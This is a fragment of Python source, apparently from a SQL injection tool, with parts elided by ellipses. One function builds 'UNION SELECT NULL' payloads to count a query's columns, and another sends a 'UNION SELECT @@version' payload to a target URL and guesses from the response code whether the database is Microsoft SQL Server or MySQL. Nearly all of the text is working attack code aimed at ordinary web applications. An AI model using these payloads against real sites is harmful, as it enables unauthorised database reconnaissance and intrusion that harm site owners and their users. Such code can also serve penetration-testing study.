...
def findColsNull(url):
    ...
    while True:
        #print(i)
        payload = url + "' UNION SELECT "+str("NULL,"*i)+"--+"
        payload = payload[:-4]+payload[-3:]
        #print(payload) 
...
def checkVersion(url):
    cols = findCols(url)
    payload = "'UNION SELECT @@version"+str(",NULL"*(cols-1))+"--+"
    #print(payload) 
    response = requests.get(url+payload)
    #print(response.headers)
    if response.status_code == 200:
        print("It's either Microsoft or MySQL Database")
    else:
        print("It's neither Microsoft nor MySQL Database")
    print()
